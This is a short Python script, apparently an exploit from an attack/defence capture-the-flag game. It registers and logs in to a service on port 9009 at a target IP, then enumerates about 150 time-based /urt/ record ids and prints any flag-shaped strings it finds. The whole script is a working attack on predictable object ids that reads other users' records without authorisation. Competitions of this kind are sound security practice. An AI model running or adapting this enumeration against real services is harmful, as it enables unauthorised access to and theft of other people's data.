#!/usr/bin/env python3

import sys
import time
import re
import requests

FLAG_RE = re.compile("[A-Z0-9]{31}=")

ip = sys.argv[1]

max_urt = int(time.time() + 1)

with requests.Session() as s:
    s.post(f"http://{ip}:9009/register", data={"username": "u8838283", "password": "u8838283!"})
    s.post(f"http://{ip}:9009/login", data={"username": "u8838283", "password": "u8838283!"})
    for u in range(max_urt, max_urt - 151, -1):
        print(u)
        text = s.get(f"http://{ip}:9009/urt/{u}").text
        for flag in FLAG_RE.findall(text):
            print(flag, flush=True)
